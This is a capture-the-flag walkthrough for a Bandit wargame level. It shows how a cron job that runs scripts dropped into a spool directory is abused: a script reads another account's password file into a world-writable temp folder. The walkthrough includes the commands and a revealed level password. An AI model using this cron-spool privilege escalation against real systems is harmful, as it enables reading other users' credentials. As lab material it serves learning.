# Level Goal
A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed. \
NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level! \
NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
# Solution
1. LOgin to session. \
2. go to directory and see whats running in the said cron. \
  cd /etc/cron.d \
  ls \
  cat cronjob_bandit24 \
3.see the contents of running file. \
cat /usr/bin/cronjob_bandit24.sh \
<img width="880" height="507" alt="image" src="https://github.com/user-attachments/assets/2971056d-ac5e-4a6d-b68f-38b4245c6897" /> \
4.Understand code. \
   - Changes directory to /var/spool/bandit24/foo . THis is because the result of myname is bandit23. \
   - THen it checks for any script it the directoory and runs it within a span of 60 seconds and then deletes the script. \
5.Now from that ,we can create our exploit. \
  HOW? \
Create a script that reads the password of bandit24 and copies it to a remote file which we can then read the password. \
Terminal:
  - mkdir /tmp/123456789 \
  - cd /tmp/123456789 \
  - nano password.sh \ 
    #! /bin/bash  
    cat /tmp/bandit_pass/bandit24 > /tmp/123456789/pass.txt \
  - chmod 777 password.sh                    # Make script executable by everyone
  -chmod 777 /tmp/123456789           # Make directory writable
  -chmod 666 /tmp/123456789/pass.txt  # Allow file to be written (will be created)
  - cp password.sh /var/spool/bandit24/foo \
  - wait for 60 seconds. \
  - cat /tmp/123456789/pass.txt \
Password for bandit 25: gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 \
<img width="536" height="93" alt="image" src="https://github.com/user-attachments/assets/8a93f6a0-1fe3-4378-971b-2525199907e1" />

